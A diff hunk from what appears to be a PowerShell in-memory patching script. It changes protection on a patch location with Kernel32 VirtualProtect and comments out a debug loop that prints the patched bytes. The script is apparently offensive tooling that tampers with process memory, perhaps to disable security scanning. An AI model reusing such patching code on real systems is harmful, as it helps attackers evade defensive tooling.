@@ -104,12 +104,12 @@ $patch1 = [byte[]] (
 $a1 = 0
 [Kernel32]::VirtualProtect($patchloc, [uint32]2, $oldProtectionBuffer1, [ref]$a1) | Out-Null
 
-[string]$bytes = ""
-[int]$i = 0
-while ($i -lt 31) {
-    [IntPtr]$targetedAddress = [IntPtr]::Add($targetedAddress, $i)
-    $bytes += "0x" + [System.BitConverter]::ToString([System.Runtime.InteropServices.Marshal]::ReadByte($targetedAddress)) + " "
-    $i++
-}
-Write-Host "[+] new Bytes: $bytes"
+#[string]$bytes = ""
+#[int]$i = 0
+#while ($i -lt 31) {
+#    [IntPtr]$targetedAddress = [IntPtr]::Add($targetedAddress, $i)
+#    $bytes += "0x" + [System.BitConverter]::ToString([System.Runtime.InteropServices.Marshal]::ReadByte($targetedAddress)) + " "
+#    $i++
+#}
+#Write-Host "[+] new Bytes: $bytes"
 }
